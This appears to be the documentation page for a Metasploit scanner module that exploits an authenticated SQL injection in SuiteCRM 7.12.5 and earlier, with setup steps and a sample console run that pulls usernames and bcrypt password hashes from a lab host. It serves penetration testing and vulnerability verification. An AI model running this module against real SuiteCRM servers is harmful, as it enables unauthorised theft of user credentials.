## Description
This module exploits an authenticated SQL injection in SuiteCRM installations below or equal to version 7.12.5. The 
vulnerability allows for union and blind boolean based SQLi to be exploited in order to collect usernames and password 
hashes from the SuiteCRM database.

## Vulnerable Application

[SuiteCRM 7.12.5](https://github.com/salesagility/SuiteCRM/releases/tag/v7.12.5)

## Verification Steps

1. Install vulnerable application
1. Install database 
1. Start up metasploit
1. Do: ```use scanner/http/suite_crm_export_sqli```
1. Do: ```set RHOSTS [IP]```
1. Configure a user and password list by setting `USERNAME` and `PASSWORD`.
1. Do: ```run```

## Scenarios

```
msf6 auxiliary(scanner/http/suite_crm_export_sqli) > set rhosts 192.168.123.207
rhosts => 192.168.123.207
msf6 auxiliary(scanner/http/suite_crm_export_sqli) > set username admin
username => admin
msf6 auxiliary(scanner/http/suite_crm_export_sqli) > set password admin
password => admin
msf6 auxiliary(scanner/http/suite_crm_export_sqli) > run

[*] Authenticating as admin
[+] Authenticated as: admin
[+] admin has administrative rights.
[+] Found user: admin
[+] Found user: msfuser
[+] Found user: JoeDerp
Got char: 0x69. Hash for user admin is now 0x2432792431302454716a4b5a346457474e59514769774475357153557530524973414f37755052644976583767496d3470776a6e2e3274345a597669
[+] User admin has user_hash: $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
Got char: 0x65. Hash for user msfuser is now 0x243279243130246b723374577a535a44624d395f792e464c5a4b66326573433161676879454d613465384b6f7673434355455f47486c426a6b674c65
[+] User msfuser has user_hash: $2y$10$kr3tWzSZDbM9_y.FLZKf2esC1aghyEMa4e8KovsCCUE_GHlBjkgLe
Got char: 0x6d. Hash for user JoeDerp is now 0x24327924313024517434696c6f65574951686756583835634d4e486965475658596c7476435f37664461593179354d684d3930535a70454e534a436d
[+] User JoeDerp has user_hash: $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC_7fDaY1y5MhM90SZpENSJCm
SuiteCRM Users and Password Hashes
==================================

 user_name  password_hash
 ---------  -------------
 JoeDerp   $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC_7fDaY1y5MhM90SZpENSJCm
 admin     $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
 msfuser   $2y$10$kr3tWzSZDbM9_y.FLZKf2esC1aghyEMa4e8KovsCCUE_GHlBjkgLe
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```